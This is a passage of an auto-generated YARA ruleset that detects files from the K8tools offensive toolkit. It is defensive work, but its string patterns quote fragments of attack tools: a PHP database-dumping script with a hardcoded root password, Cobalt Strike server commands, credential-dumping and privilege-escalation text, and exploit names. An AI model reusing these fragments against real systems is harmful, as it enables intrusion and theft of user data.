      $s12 = ".comment.SUSE.OPTs" fullword ascii /* score: '11.00'*/
      $s13 = "mkdtemp@@GLIBC_2.2.5" fullword ascii /* score: '11.00'*/
      $s14 = "f_temppath" fullword ascii /* score: '11.00'*/
      $s15 = "03333333333" ascii /* reversed goodware string '33333333330' */ /* score: '11.00'*/
      $s16 = "testTempPath" fullword ascii /* score: '11.00'*/
      $s17 = "Error loading Python lib '%s': %s" fullword ascii /* score: '10.00'*/
      $s18 = "\\7=B\\?@" fullword ascii /* score: '10.00'*/ /* hex encoded string '{' */
      $s19 = "runScripts" fullword ascii /* score: '10.00'*/
      $s20 = "PI_GetProgramFullPath" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 15000KB and
      8 of them
}

rule K8dllhijack {
   meta:
      description = "K8tools - file K8dllhijack.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "ce025348f6892a9d2e1462358ab2180c32d1ff3bfb4293f9faad544621f1a6e8"
   strings:
      $s1 = "K8dllhijack\\K8dllhijack.dll" fullword ascii /* score: '20.42'*/
      $s2 = "WINRAR.JPG" fullword ascii /* score: '10.00'*/
      $s3 = "K8dllhijack\\DLL" fullword ascii /* score: '9.42'*/
      $s4 = "K8dllhijack\\" fullword ascii /* score: '9.00'*/
      $s5 = "K8dllhijack" fullword ascii /* score: '9.00'*/
      $s6 = "s%v%u-}" fullword ascii /* score: '7.50'*/
      $s7 = ")\\Desktop.JPG" fullword ascii /* score: '7.42'*/
      $s8 = "UUUUUUUUC" fullword ascii /* score: '6.50'*/
      $s9 = "\\VS2015.JPG" fullword ascii /* score: '5.00'*/
      $s10 = "\\VS2012.JPG" fullword ascii /* score: '5.00'*/
      $s11 = "lnprtw" fullword ascii /* score: '5.00'*/
      $s12 = "\\VS10.JPG" fullword ascii /* score: '5.00'*/
      $s13 = "\\VS08.JPG" fullword ascii /* score: '5.00'*/
      $s14 = "nxyK4Q " fullword ascii /* score: '4.42'*/
      $s15 = "')+-/1357CEGIKMOQSacegikmoq" fullword ascii /* score: '4.42'*/
      $s16 = "|>.hdfnvffvhhHfhvde" fullword ascii /* score: '4.00'*/
      $s17 = "Fog\\MoJNZoaZ<[/" fullword ascii /* score: '4.00'*/
      $s18 = "VX\\^\\>JdjdZhTZ\\[" fullword ascii /* score: '4.00'*/
      $s19 = "7;?CGKOSW[sw{" fullword ascii /* score: '4.00'*/
      $s20 = "-efyLi!^" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 1000KB and
      8 of them
}

rule K8tools_sshtest {
   meta:
      description = "K8tools - file sshtest.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "d7d61aa444474253820c7edac264f911d8242a0998c87bd28c24a21f217703fa"
   strings:
      $x1 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Central Brazilian Standard TimeMoun" ascii /* score: '69.50'*/
      $x2 = "ssh: unmarshal error for field %s of type %s%sstopTheWorld: not stopped (status != _Pgcstop)P has cached GC work at end of mark " ascii /* score: '54.00'*/
      $x3 = "Pakistan Standard TimeParaguay Standard TimeSakhalin Standard TimeTasmania Standard Timeaddress already in useadvapi32.dll not f" ascii /* score: '50.00'*/
      $x4 = "non-IPv4 addressnon-IPv6 addressobject is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: gp: gp=" ascii /* score: '49.00'*/
      $x5 = "> (den<<shift)/2syntax error scanning number45474735088646411895751953125Central America Standard TimeCentral Pacific Standard T" ascii /* score: '48.00'*/
      $x6 = "152587890625762939453125Bidi_ControlGetAddrInfoWGetConsoleCPGetLastErrorGetLengthSidGetStdHandleGetTempPathWJoin_ControlLoadLibr" ascii /* score: '44.00'*/
      $x7 = "unixpacketunknown pcws2_32.dll  of size   (targetpc= gcwaiting= gp.status= heap_live= idleprocs= in status  m->mcache= mallocing" ascii /* score: '43.00'*/
      $x8 = "Variation_Selectorbad manualFreeListbufio: buffer fullconnection refusedcontext.Backgroundecdh-sha2-nistp256ecdh-sha2-nistp384ec" ascii /* score: '41.00'*/
      $x9 = "ssh: channel response message received on inbound channelsync: WaitGroup misuse: Add called concurrently with Waitruntime: GetQu" ascii /* score: '39.50'*/
      $x10 = "of unexported method previous allocCount=186264514923095703125931322574615478515625AdjustTokenPrivilegesAlaskan Standard TimeAna" ascii /* score: '38.00'*/
      $x11 = "file descriptor in bad statefindrunnable: netpoll with pgcstopm: negative nmspinninginvalid runtime symbol tablelarge span treap" ascii /* score: '37.00'*/
      $x12 = "to unallocated span%%!%c(*big.Float=%s)37252902984619140625: leftover defer sp=Arabic Standard TimeAzores Standard TimeCertOpenS" ascii /* score: '35.00'*/
      $x13 = "invalid network interface nameinvalid pointer found on stacknode is not its parent's childnotetsleep - waitm out of syncprotocol" ascii /* score: '34.50'*/
      $x14 = "structure needs cleaningunknown channel type: %v bytes failed with errno= to unused region of span2910383045673370361328125AUS C" ascii /* score: '33.00'*/
      $x15 = "bad flushGen bad map statechannelEOFMsgdisconnectMsgempty integerexchange fullfatal error: gethostbynamegetservbynamehmac-sha2-2" ascii /* score: '33.00'*/
      $x16 = "o client compressionssh-dss-cert-v01@openssh.comssh-rsa-cert-v01@openssh.comssh: public key not on curvesshlogin host port user " ascii /* score: '33.00'*/
      $x17 = "mismatchadvapi32.dllbad flushGenbad g statusbad g0 stackbad recoverycan't happencas64 failedchan receivecontext.TODOdumping heap" ascii /* score: '32.00'*/
      $x18 = "MB) workers= called from  flushedWork  gcscanvalid  heap_marked= idlethreads= is nil, not  nStackRoots= s.spanclass= span.base()" ascii /* score: '32.00'*/
      $x19 = "bytes.Buffer: reader returned negative count from ReadgcControllerState.findRunnable: blackening not enabledinternal error: poll" ascii /* score: '31.00'*/
      $x20 = "garbage collection scangcDrain phase incorrectglobalRequestFailureMsgglobalRequestSuccessMsginterrupted system callinvalid m->lo" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      ( pe.imphash() == "1c2a6fbef41572f4c9ce8acb5a63cde7" or 1 of ($x*) )
}

rule K8__DotNetNuke_DNNspot_Store__3_0_GetShell_exploit {
   meta:
      description = "K8tools - file K8  DotNetNuke DNNspot Store =3.0 GetShell exploit.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "2b6235f9842ba617e467d1b13e4ca6af056f90e0c14a4279f6372850ee8f3cc8"
   strings:
      $s1 = "DotNetNuke DNNspot Store =3.0 GetShell exploit\\DNNspot_upload_exec.rb" fullword ascii /* score: '23.00'*/
      $s2 = "DotNetNuke DNNspot Store =3.0 GetShell exploit\\sdfdf.png" fullword ascii /* score: '21.00'*/
      $s3 = "DotNetNuke DNNspot Store =3.0 GetShell exploit" fullword ascii /* score: '18.00'*/
      $s4 = "DotNetNuke DNNspot Store =3.0 GetShell exploit\\DNNspot_upload_aspx.rb" fullword ascii /* score: '18.00'*/
      $s5 = "416:1:6=5" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Aae' */
      $s6 = "jnnnjrjfzzaa" fullword ascii /* score: '8.00'*/
      $s7 = "qeyqeeuc" fullword ascii /* score: '8.00'*/
      $s8 = "Jtniiqckkieuck" fullword ascii /* score: '6.00'*/
      $s9 = "Bwqqnyycg" fullword ascii /* score: '6.00'*/
      $s10 = "Rhllllll" fullword ascii /* score: '6.00'*/
      $s11 = "Hrazzxp" fullword ascii /* score: '6.00'*/
      $s12 = "f + + " fullword ascii /* score: '5.00'*/
      $s13 = "e;'O -\\" fullword ascii /* score: '5.00'*/
      $s14 = "sbrfjR7" fullword ascii /* score: '5.00'*/
      $s15 = "\\SKsWOOs[{" fullword ascii /* score: '5.00'*/
      $s16 = "\\vUGX@A-" fullword ascii /* score: '5.00'*/
      $s17 = "\\WwOK[[K[" fullword ascii /* score: '5.00'*/
      $s18 = "\\nIggkG{{G" fullword ascii /* score: '5.00'*/
      $s19 = "vJnvjN4" fullword ascii /* score: '5.00'*/
      $s20 = "DTEUeA " fullword ascii /* score: '4.42'*/
   condition:
      uint16(0) == 0x6152 and filesize < 1000KB and
      8 of them
}

rule K8___________________________ {
   meta:
      description = "K8tools - file K8文件夹个性设置工具.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "86429eba2156c16011ae99f7097ac17182ef4d7bdabc6bc76661f87ec4b2d986"
   strings:
      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s2 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s3 = "ystem.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s4 = "http://qqhack8.blog.163.com/blog/static/114147985201112115627960" fullword wide /* score: '22.00'*/
      $s5 = " (*.exe)|*.exe" fullword wide /* score: '16.42'*/
      $s6 = "GetPrivateProfileString" fullword ascii /* score: '12.00'*/
      $s7 = "usbdrive" fullword ascii /* score: '8.00'*/
      $s8 = "lblpath" fullword wide /* score: '8.00'*/
      $s9 = "checkusb" fullword ascii /* score: '8.00'*/
      $s10 = "bgimgview" fullword wide /* score: '8.00'*/
      $s11 = "txtbgimg" fullword wide /* score: '8.00'*/
      $s12 = "WWW.QQKISS.TK" fullword wide /* score: '7.00'*/
      $s13 = "\\k8Foldercustomtool\\obj\\x86\\Debug\\K8" fullword ascii /* score: '7.00'*/
      $s14 = "K:\\hack" fullword ascii /* score: '7.00'*/
      $s15 = "k8Foldercustomtool.Properties.Resources.resources" fullword ascii /* score: '7.00'*/
      $s16 = "k8Foldercustomtool.Form1.resources" fullword ascii /* score: '7.00'*/
      $s17 = "WritePrivateProfileString" fullword ascii /* score: '7.00'*/
      $s18 = "k8Foldercustomtool.AboutFrm.resources" fullword ascii /* score: '7.00'*/
      $s19 = "k8Foldercustomtool.Properties.Resources" fullword wide /* score: '7.00'*/
      $s20 = "IniReadValue" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule post_update {
   meta:
      description = "K8tools - file post-update.sample"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "81765af2daef323061dcbc5e61fc16481cb74b3bac9ad8a174b186523586f6c5"
   strings:
      $s1 = "# An example hook script to prepare a packed repository for use over" fullword ascii /* score: '14.00'*/
      $s2 = "# To enable this hook, rename this file to \"post-update\"." fullword ascii /* score: '13.00'*/
      $s3 = "exec git update-server-info" fullword ascii /* score: '12.00'*/
      $s4 = "# dumb transports." fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule K8tools_Ladon {
   meta:
      description = "K8tools - file Ladon.ps1"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "d62b1da2d002a0783fbec1195ffd5f74e5d9b79bef1da7d300b9f6060023d9ef"
   strings:
      $x1 = "7b0HYBxJliUmL23Ke39K9UrX4HShCIBgEyTYkEAQ7MGIzeaS7B1pRyMpqyqBymVWZV1mFkDM7Z28995777333nvvvfe6O51OJ/ff/z9cZmQBbPbOStrJniGAqsgfP358" ascii /* score: '32.00'*/
      $s2 = "If([String]::IsNullOrEmpty($bH8T3b)){If($Q7MGIzea -eq \"OnlinePC\" -or $Q7MGIzea -eq \"OnlineIP\" -or $Q7MGIzea -eq \"OsScan\" -" ascii /* score: '28.00'*/
      $s3 = "Execute Ladon on the local computer to scan network OnlinePC." fullword ascii /* score: '25.00'*/
      $s4 = "Author: K8gege (https://github.com/k8gege)" fullword ascii /* score: '20.00'*/
      $s5 = "Function: Ladon (https://github.com/k8gege/Ladon)" fullword ascii /* score: '17.00'*/
      $s6 = "dump credentials without ever writing the Ladon binary to disk. " fullword ascii /* score: '17.00'*/
      $s7 = "v92b//y3+A2e1lf/6/eeTv673+M3+9N+/f/mP/+r/vY/6Xf8bf6D/+mX/gf/1T/1Z7V/QPvHP539U8+q49/9l/92f9j6N328+PIPefRn/B7/1+Wv+bv/Wr/Bn/dHfPnl" ascii /* score: '16.00'*/
      $s8 = "3v0t/8wf98v/6N2nf/j23/F7rbIv/93/8T9+9Cf89Oh/+02W/9Av+aV/ym/6u939R3+fP+uf+Ft2/54fTP6ln/od/pF/+vf+nR7+F//YHzH5T373P+Bv/4N/0b/wD/0t" ascii /* score: '15.42'*/
      $s9 = "0P43G2j/bw20T+nHzh/8G/waf9Qb983f9a//Br/Gb+W1/Ofo79/X44Wtf+s3+DX+G6+frV+DxwuaENRUPvwJ8o7G8v8PfNSPYrLClfv16P8/Rv//jej/vyn9/zen/wPd" ascii /* score: '15.17'*/
      $s10 = "7x/5B//Niz/n7S+7+sv/6N/hzu/7mxxd/3f/21/xveZ/+1f/jv/0j9j6Zd96+Zf+Fb/Fn/Fr/IJf/rv/mp//kf/BL/s1fq8/+E989Ps9/Id/37sPyj/0N/8X/qi/4q//" ascii /* score: '15.01'*/
      $s11 = "+s9/4tE/+C/9J3/J3/+f/LJ/93c9/g3+tn/27/11/su/68/99I/59f7Zv/SX/z6/3v5//BsUX977S3+HP+O//fTPmV/9yfWf+8c9O/u3vvgL/51fOf3t/v2PLv/5f+ff" ascii /* score: '15.00'*/
      $s12 = "+jdf/5l/w3/yP17/1r/nf/Z/Xv8Jf8H/9Yf9mg9+4/Wf+/vdT36v/+TBT/wNP3j+u373l/x7f+zpf/9b/42/5NN/8T/8z3/T3+HfTPb/52dXv8nuP/uH/r6/7y/6Y9of" ascii /* score: '15.00'*/
      $s13 = "//T3/i3+sT/4H/wH/47f8f/+9f7z/3b27/7hn37nJ/+az5/8SX/Sb/vlP3j9E7/5H/iP/km/+RfTP/3tvz/9hz75BX/fb33w3f/0r3v7X/0BZ//L+LfZu/qr/ph/5eQf" ascii /* score: '15.00'*/
      $s14 = "9G/8pX/bL/tDP/9zt/+Nv/izP/H4+0fTP/N3/Fv/TMoJ/95X/+M/3vzY3/PH/pO/4T/8p/9X3/neP7j87/+K3+OX/db5r/nf/TF/zn95+q//jn/Jr/3m+i/8I/7Of/gv" ascii /* score: '15.00'*/
      $s15 = "O3/jH/af/6v/SPPb/0l/z53//X/5q2af/6H/4L/4u/9OX/63f/t3/tEfTP7Sf+vtX/Irf71/9+rX/yv/qLfl/C95+R+u/4B/7I/4O36bn/i1/vo/6A/+qd/vN/57fvm/" ascii /* score: '15.00'*/
      $s16 = "ftPfYO/v/3Pv/Um/zvI/+C1/+5Oz4j/+Q0/+2F/5t/zm/+uf8U9c/xq/XvMg+TV+x7/0N376G/z5/+rv/+yf/Wu+vf6z/42rX+ts/uqX/VlXv9NXF//Z6j/+Z/65P/jf" ascii /* score: '15.00'*/
      $s17 = "f6z+7X7Xf/IP+KV/2+RX/4G/+d/6O/+Ov9Hdv/rfOftP/pB/78lvvf03/Rb/81/+i//hf+/k1yy/9Vc//ofm/8qTf+QP+O/+hD/nN/injn7H/7X9zv/wj/71v/w/+3f+" ascii /* score: '15.00'*/
      $s18 = "/pI/4ez/+MN/jVf/xX/7r/347/mL/70/9L/9E//yO79P/etu/bFPL/7Sh//6f/CX/tT0d/v+3/Cffvvf/ff+nN/h3/6vftP/9K/+q//eP+0X/p9b6R9e/Wf/6Z/yPx78" ascii /* score: '15.00'*/
      $s19 = "xL//9rf/9Hf4t/6K//Bg9Ff9s7/t3/Anzn/Hl3/Hn/nX/13/3T/zv/9jf9nftP/X/Pq/w2fn/9mftv+dv/+fP/mnir/0t746+N9/5fZPH/8Lv+N/+W/8u1v/+D//h53/" ascii /* score: '15.00'*/
      $s20 = "PPh7jv62/+NP/9v/+N/gV/8Lf+9f+99+9PEf9o/91//7f7T1nce/5bf/j//gt0yO/4z99fhnftPZH/27r3/hH/Gb7S/+wKu/5+Nf9BdVf83V//iPbP/nv8v+nd/izq+6" ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5023 and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule K8upload_1125_K8_ {
   meta:
      description = "K8tools - file K8upload_1125[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "a9ed556fe70eba4b935ce9a3724a74756750d3ffd42f654846c731da99a6f6d7"
   strings:
      $s1 = "K8upload.exe" fullword ascii /* score: '24.00'*/
      $s2 = "\\LivFU 9" fullword ascii /* score: '5.00'*/
      $s3 = "vbUq\"," fullword ascii /* score: '4.00'*/
      $s4 = "rSlCU'L" fullword ascii /* score: '4.00'*/
      $s5 = "mnka!/" fullword ascii /* score: '4.00'*/
      $s6 = "8;.dYK" fullword ascii /* score: '4.00'*/
      $s7 = "mLWzo?" fullword ascii /* score: '4.00'*/
      $s8 = "GftnZHb" fullword ascii /* score: '4.00'*/
      $s9 = "kKmfh? `" fullword ascii /* score: '4.00'*/
      $s10 = "qqzNm\\t" fullword ascii /* score: '4.00'*/
      $s11 = "urHj!^" fullword ascii /* score: '4.00'*/
      $s12 = "bLXZA8HW(" fullword ascii /* score: '4.00'*/
      $s13 = "DBKw8(hA" fullword ascii /* score: '4.00'*/
      $s14 = "ylsylbh(" fullword ascii /* score: '4.00'*/
      $s15 = "zMyxN4v" fullword ascii /* score: '4.00'*/
      $s16 = "AZFeQH:=<q" fullword ascii /* score: '4.00'*/
      $s17 = "]mkoK?" fullword ascii /* score: '4.00'*/
      $s18 = "MLjS75" fullword ascii /* score: '2.00'*/
      $s19 = "\\s'}=;cs" fullword ascii /* score: '2.00'*/
      $s20 = "qB%@] " fullword ascii /* score: '1.42'*/
   condition:
      uint16(0) == 0x6152 and filesize < 700KB and
      8 of them
}

rule TeamServer {
   meta:
      description = "K8tools - file TeamServer.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "ecc8d1c500e3690eb336d35beff7978cba3faa6255e3f689ffc011782897973d"
   strings:
      $x1 = "'oShell.Run(\"cmd /c copy \"&Chr(34)&jvmPathC&\"jvm.dll\"&Chr(34)&\" \"&Chr(34)&jvmPathS&\"jvm.dll\"&Chr(34) & \" /y\"),0,FALSE" fullword ascii /* score: '32.00'*/
      $s2 = "fso.getfile(jvmPathC&\"\\jvm.dll\").copy(jvmPathS) " fullword ascii /* score: '24.42'*/
      $s3 = "'oShell.Run(\"cmd /c md \"&Chr(34)&jvmPathS&Chr(34)),0,FALSE" fullword ascii /* score: '23.00'*/
      $s4 = "java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=50050 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyS" ascii /* score: '21.42'*/
      $s5 = "3339333633383339333033343334333500007556" ascii /* score: '19.00'*/ /* hex encoded string '3936383930343435uV' */
      $s6 = "75567556344233383637363536373635" ascii /* score: '19.00'*/ /* hex encoded string 'uVuV4B3867656765' */
      $s7 = "000075567556344233383637363536373635000000000000000000002E2E2E2E2E2E000000000000344233383637363536373635000000000000353135313333" ascii /* score: '18.00'*/ /* hex encoded string 'uVuV4B3867656765......4B3867656765515133' */
      $s8 = "000075567556344233383637363536373635000000000000000000002E2E2E2E2E2E000000000000344233383637363536373635000000000000353135313333" ascii /* score: '18.00'*/ /* hex encoded string 'uVuV4B3867656765......4B38676567655151333936383930343435uV' */
      $s9 = "cmd /c title TeamServer &&" fullword ascii /* score: '17.00'*/
      $s10 = "344233383637363536373635" ascii /* score: '17.00'*/ /* hex encoded string '4B3867656765' */
      $s11 = "java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=50050 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyS" ascii /* score: '17.00'*/
      $s12 = "2E2E2E2E2E2E" ascii /* score: '17.00'*/ /* hex encoded string '......' */
      $s13 = "35313531333333393336333833393330333433343335" ascii /* score: '17.00'*/ /* hex encoded string '5151333936383930343435' */
      $s14 = "cscript fix.vbs" fullword ascii /* score: '17.00'*/
      $s15 = "if fso.fileExists(jvmPathS&\"\\jvm.dll\")=FALSE Then" fullword ascii /* score: '16.00'*/
      $s16 = "'fso.CopyFile jvmPathC&\"\\jvm.dll\",jvmPathS &\"\\jvm.dll\"" fullword ascii /* score: '16.00'*/
      $s17 = "torePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar server.TeamServer " fullword ascii /* score: '15.42'*/
      $s18 = "path=oShell.ExpandEnvironmentStrings(\"%Path%\")" fullword ascii /* score: '13.00'*/
      $s19 = "Set oShell = CreateObject( \"WScript.Shell\" )" fullword ascii /* score: '12.01'*/
      $s20 = "FUnitCmdShell" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      ( pe.imphash() == "a191434e882208801f5a4be6db254625" or ( 1 of ($x*) or 4 of them ) )
}

rule K8_mysql______20170114________ {
   meta:
      description = "K8tools - file K8_mysql脱裤20170114(千万).php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "8c39c6f962868b43c7e9f8f68432191b1f24ed09b717d6a92a5600eea00896b2"
   strings:
      $s1 = "$conn = @mysql_connect(\"192.168.241.89\", \"root\", \"Vega2010##\") or die(\"X Connect failed\");" fullword ascii /* score: '17.00'*/
      $s2 = "username,password,phone,address" fullword ascii /* score: '15.00'*/
      $s3 = "fwrite($fp,'\"'.@$row[username].'\",\"'.@$row[password].'\"'.'\",\"'.@$row[phone].'\"'.\"\\n\"); " fullword ascii /* score: '12.42'*/
      $s4 = "$sql=\"select username,password,phone from user limit 12500000,500000\";" fullword ascii /* score: '12.00'*/
      $s5 = "username,password,phone,fullname" fullword ascii /* score: '12.00'*/
      $s6 = "username,password,phone,email" fullword ascii /* score: '12.00'*/
      $s7 = "$fp = fopen('t4/14.csv', 'a'); " fullword ascii /* score: '7.42'*/
      $s8 = "log_app" fullword ascii /* score: '6.00'*/
      $s9 = "echo 'finished';" fullword ascii /* score: '4.42'*/
      $s10 = "fclose($fp); " fullword ascii /* score: '4.42'*/
      $s11 = "mysql_select_db(\"chacha_cloud\", $conn);" fullword ascii /* score: '4.17'*/
      $s12 = "user" fullword ascii /* score: '4.01'*/
      $s13 = "device_name,imei,phone" fullword ascii /* score: '4.00'*/
      $s14 = "mysql_query(\"set names 'UTF-8'\"); " fullword ascii /* score: '4.00'*/
      $s15 = "$query=mysql_query($sql);" fullword ascii /* score: '4.00'*/
      $s16 = "while($row=mysql_fetch_array($query)){" fullword ascii /* score: '4.00'*/
      $s17 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
   condition:
      uint16(0) == 0x6d3c and filesize < 2KB and
      8 of them
}

rule ______System2AdminRun_0419_K8_ {
   meta:
      description = "K8tools - file 降权System2AdminRun_0419[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "e0db40d3e75c9784d63371d2d0ae07e0129b04e00745795d02d751cc8407f1e9"
   strings:
      $s1 = "System2AdminRun.exe" fullword ascii /* score: '25.00'*/
      $s2 = "m.MoC " fullword ascii /* score: '4.42'*/
      $s3 = "&IRjI2Mq'" fullword ascii /* score: '4.00'*/
      $s4 = "SiXjC2\\" fullword ascii /* score: '4.00'*/
      $s5 = "Hvxe\"K" fullword ascii /* score: '4.00'*/
      $s6 = "\\t4<F<p" fullword ascii /* score: '2.00'*/
      $s7 = "0uq3e5-\\Na*" fullword ascii /* score: '1.17'*/
      $s8 = "( N~9$" fullword ascii /* score: '1.00'*/
      $s9 = "<ZKS X" fullword ascii /* score: '1.00'*/
      $s10 = "n c>\"{" fullword ascii /* score: '1.00'*/
      $s11 = "Ki?<o^" fullword ascii /* score: '1.00'*/
      $s12 = "u&NF?O" fullword ascii /* score: '1.00'*/
      $s13 = ";2zz.OE." fullword ascii /* score: '1.00'*/
      $s14 = "=j3ejsl" fullword ascii /* score: '1.00'*/
      $s15 = "}(Us!*" fullword ascii /* score: '1.00'*/
      $s16 = ">b%@8~#" fullword ascii /* score: '1.00'*/
      $s17 = "rhLv4J" fullword ascii /* score: '1.00'*/
      $s18 = "uI5udh" fullword ascii /* score: '1.00'*/
      $s19 = "j\"&F>V" fullword ascii /* score: '1.00'*/
      $s20 = ">R*GAd" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 60KB and
      8 of them
}

rule K8tools_SharpUp {
   meta:
      description = "K8tools - file SharpUp.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "6472c81e5e295d93ff9501594b8b42a69ce24569b455d7785c8d31bad91e0605"
   strings:
      $x1 = "c:\\Users\\null\\Desktop\\SharpUp-master\\SharpUp\\obj\\Debug\\SharpUp.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s3 = "SharpUp.exe" fullword wide /* score: '22.00'*/
      $s4 = "GetAlwaysInstallElevated" fullword ascii /* score: '18.00'*/
      $s5 = "[*] In medium integrity but user is a local administrator- UAC can be bypassed." fullword wide /* score: '18.00'*/
      $s6 = "{0}\\System32\\Sysprep\\unattend.xml" fullword wide /* score: '17.07'*/
      $s7 = "{0}\\System32\\Sysprep\\Panther\\unattend.xml" fullword wide /* score: '17.03'*/
      $s8 = "[*] Completed Privesc Checks in {0} seconds" fullword wide /* score: '17.00'*/
      $s9 = "=== AlwaysInstallElevated Registry Keys ===" fullword wide /* score: '16.00'*/
      $s10 = "cPassword: {0}" fullword wide /* score: '16.00'*/
      $s11 = "{0}\\Users\\" fullword wide /* score: '15.00'*/
      $s12 = "[*] Already in high integrity, no need to privesc!" fullword wide /* score: '15.00'*/
      $s13 = "GetModifiableServiceBinaries" fullword ascii /* score: '15.00'*/
      $s14 = "Services.xml" fullword wide /* score: '13.00'*/
      $s15 = "^\\W*([a-z]:\\\\.+?(\\.exe|\\.dll|\\.sys))\\W*" fullword wide /* score: '13.00'*/
      $s16 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceService" fullword wide /* score: '13.00'*/
      $s17 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunService" fullword wide /* score: '13.00'*/
      $s18 = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunService" fullword wide /* score: '13.00'*/
      $s19 = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnceService" fullword wide /* score: '13.00'*/
      $s20 = "GetCachedGPPPassword" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 80KB and
      1 of ($x*) and 4 of them
}

rule CVE_2019_11043_POC {
   meta:
      description = "K8tools - file CVE-2019-11043-POC.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "e0ac305b7421eefeb38d8125d533c25513fc92c13523e08391088b032763eab6"
   strings:
      $s1 = "exe=F:\\Python279\\python.exe" fullword ascii /* score: '21.17'*/
      $s2 = "CVE-2019-11043_POC.ini" fullword ascii /* score: '8.00'*/
      $s3 = "CVE-2019-11043-POC.PNG" fullword ascii /* score: '8.00'*/
      $s4 = "arg=CVE-2019-11043-POC.py $ip$" fullword ascii /* score: '5.00'*/
      $s5 = "CVE-2019-11043-POC.py" fullword ascii /* score: '5.00'*/
      $s6 = "hSeq>f_" fullword ascii /* score: '4.00'*/
      $s7 = "khrdK\"" fullword ascii /* score: '4.00'*/
      $s8 = "pS}}_ " fullword ascii /* score: '1.42'*/
      $s9 = "wgltPl" fullword ascii /* score: '1.00'*/
      $s10 = "(aQ3Pm" fullword ascii /* score: '1.00'*/
      $s11 = "XaK%#;'" fullword ascii /* score: '1.00'*/
      $s12 = "W>+uWY" fullword ascii /* score: '1.00'*/
      $s13 = "f[Ladon]" fullword ascii /* score: '1.00'*/
      $s14 = "3RnK]R" fullword ascii /* score: '1.00'*/
      $s15 = "=8oHeYz" fullword ascii /* score: '1.00'*/
      $s16 = "0IR/3~" fullword ascii /* score: '1.00'*/
      $s17 = "3Ebtf/i" fullword ascii /* score: '1.00'*/
      $s18 = "G5]\"Ll," fullword ascii /* score: '1.00'*/
      $s19 = "v|#&_IU" fullword ascii /* score: '1.00'*/
      $s20 = "C=WZ-f%" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 60KB and
      8 of them
}

rule K8expList {
   meta:
      description = "K8tools - file K8expList.txt"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "54da2a39d83d8dd1dbb3cfeba1d6d145777999b1ebf79833eba92485f4824a16"
   strings:
      $s1 = "307  CMS Made Simple <= 1.2.2 (TinyMCE module) - Remote SQL Injection" fullword ascii /* score: '25.00'*/
      $s2 = "327  XAMPP for Windows 1.8.2 - Blind SQL Injection" fullword ascii /* score: '22.00'*/
